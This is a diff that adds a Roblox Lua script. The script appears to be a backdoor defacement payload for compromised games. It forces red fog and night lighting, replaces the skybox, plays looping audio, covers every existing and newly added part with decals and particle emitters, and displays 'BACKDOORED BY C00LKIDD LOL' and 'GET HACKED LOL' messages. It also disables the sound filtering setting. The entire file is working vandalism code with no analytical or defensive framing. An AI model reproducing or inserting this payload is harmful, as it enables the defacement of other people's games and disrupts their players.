@@ -1,0 +1,81 @@
+local aud = 1839246711
+local img = 158118263
+local hint = "BACKDOORED BY C00LKIDD LOL"
+local msg = "GET HACKED LOL!!!!!"
+
+-- Custom atmosphere
+
+local ss = game:GetService('SoundService')
+local ws = game:GetService('Workspace')
+local plrs = game:GetService('Players')
+local lght = game:GetService('Lighting')
+
+local faces = {Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Left,Enum.NormalId.Right,Enum.NormalId.Top,Enum.NormalId.Bottom}
+
+local sky
+
+if not lght:FindFirstChildWhichIsA("Sky") then
+sky = Instance.new("Sky",lght)
+else
+sky = lght:FindFirstChildWhichIsA("Sky")
+end
+
+task.spawn(function()
+while wait() do
+
+lght.Ambient = Color3.new(0.25,0,0)
+lght.Brightness = 2
+lght.ClockTime = 0
+lght.FogStart = 0
+lght.FogEnd = 100
+lght.FogColor = Color3.new(0.25,0,0)
+
+ss.AmbientReverb = Enum.ReverbType.Arena
+ss.RespectFilteringEnabled = false
+
+sky.SkyboxBk = "rbxassetid://"..tostring(img)
+sky.SkyboxFt = "rbxassetid://"..tostring(img)
+sky.SkyboxLf = "rbxassetid://"..tostring(img)
+sky.SkyboxRt = "rbxassetid://"..tostring(img)
+sky.SkyboxDn = "rbxassetid://"..tostring(img)
+sky.SkyboxUp = "rbxassetid://"..tostring(img)
+
+sky.CelestialBodiesShown = false
+sky.StarCount = 0
+
+end
+end)
+
+local B = Instance.new("Sound",ss)
+B.SoundId = "rbxassetid://"..tostring(aud)
+B.Volume = 2.5
+B.Looped = true
+B.Playing = true
+
+for _,inst in pairs(ws:GetDescendants()) do
+if inst:IsA("BasePart") then
+for i,face in pairs(faces) do
+local dcl = Instance.new("Decal",inst)
+dcl.Texture = "rbxassetid://"..tostring(img)
+dcl.Face = face
+end
+Instance.new("ParticleEmitter",inst).Texture = "rbxassetid://"..tostring(img)
+end
+end
+
+ws.DescendantAdded:Connect(function(inst)
+if inst:IsA("BasePart") then
+for i,face in pairs(faces) do
+local dcl = Instance.new("Decal",inst)
+dcl.Texture = "rbxassetid://"..tostring(img)
+dcl.Face = face
+end
+Instance.new("ParticleEmitter",inst).Texture = "rbxassetid://"..tostring(img)
+end
+end)
+
+Instance.new("Hint",workspace).Text = hint 
+local msgy = Instance.new("Message",workspace)
+msgy.Text = msg 
+wait(7.5) 
+msgy:Destroy()
